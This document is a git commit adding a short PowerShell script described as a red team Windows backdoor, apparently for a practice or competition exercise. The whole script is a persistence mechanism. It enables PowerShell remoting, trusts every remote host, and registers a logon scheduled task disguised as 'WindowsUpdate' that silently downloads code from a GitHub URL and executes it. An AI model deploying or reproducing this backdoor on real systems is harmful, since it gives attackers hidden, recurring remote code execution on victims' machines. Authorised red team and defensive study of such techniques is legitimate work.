e30473ff2e193ec016ef06097805b0deae8c5b94
JonRodriguez3037 <89416066+JonFingas@users.noreply.github.com>
2025-11-25 00:19:23 -0500

    Add files via upload
    Reupload of Red Team tool for Windows Backdoor

---
+++ redteam/AlphaRedTeamWindowsPersistance.ps1
@@ -0,0 +1,6 @@
+﻿Enable-PSRemoting -Force
+Set-Item wsman: localhostClientTrustedHosts -Value *
+
+$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -command "& {IEX ((New-Object Net.WebClient).DownloadString(''https://github.com/abraccia/CDT-Alpha/tree/redteam''))}"'
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsUpdate" -Description "Ensures system is up to date" 
